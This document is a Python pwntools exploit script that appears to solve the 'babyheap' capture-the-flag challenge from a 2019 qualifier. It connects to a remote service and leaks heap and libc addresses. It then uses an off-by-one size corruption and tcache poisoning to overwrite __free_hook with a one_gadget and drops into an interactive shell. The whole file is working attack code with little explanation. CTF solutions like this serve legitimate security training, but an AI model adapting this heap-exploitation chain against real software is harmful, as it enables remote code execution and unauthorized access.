from pwn import *

# p = process("./babyheap")
p = remote('babyheap.quals2019.oooverflow.io', 5000)

def menu():
    p.recvuntil('> ')

def malloc(size, content):
    menu()
    p.sendline('M')
    menu()
    p.sendline(str(size))
    menu()
    p.send(content)

def free(index):
    menu()
    p.sendline('F')
    menu()
    p.sendline(str(index))

malloc(0x1, '\n')
malloc(0x1, '\n')
free(0)
free(1)
malloc(0x1, '\n')
p.sendline('S')
menu()
p.sendline(str(0))
menu()
heap = u64(p.recvline().strip().ljust(8, '\x00'))
print hex(heap)
free(0)

for i in range(6):
    malloc(0xf8, 'AAAA\n')
malloc(0x178, 'BBBB\n') # 6
malloc(0xf8, 'AAAA\n') # 7 --> 0x178
malloc(0xf8, 'AAAA\n') # 8
malloc(0xf8, 'AAAA\n') # 9

for i in range(6):
   free(i)
free(9)
free(8)

for i in range(6):
    malloc(0xf8, 'AAAA\n')

free(6)
malloc(0x178, '\x81' * 0x17a) # 6
free(7)
malloc(0x100, 'C' * 0xf0 + 'C' * 16 + '\n') # 7
p.sendline('S')
p.sendline(str(7)) # index 7 is unsorted bin
p.recvuntil('C' * 0x100)
leak = u64(p.recvline().strip().ljust(8, '\x00'))

free(7)
malloc(0x100, 'C' * 0xf0 + 'C' * 8 + '\x01\x01\n') # let's fix size after corruption
malloc(0xf8, 'BBBBBBBB\n')
malloc(0xf8, 'DDDDDDDD\n')

free(1)
free(9)
free(7)
libc_base = leak - 0x1e4ca0
free_hook = libc_base + 0x1e75a8
one_gadget = libc_base + 0xe2383
malloc(0x178, 'F' * 0xf0 + 'F' * 16 + p64(free_hook)[:-2] + '\n') # overwrite tcache next with free hook

malloc(0xf8, 'DDDDDDDD\n')
malloc(0xf8, p64(one_gadget)[:-2] + '\n') # fill free_hook with one gadget
free(2)

p.interactive()
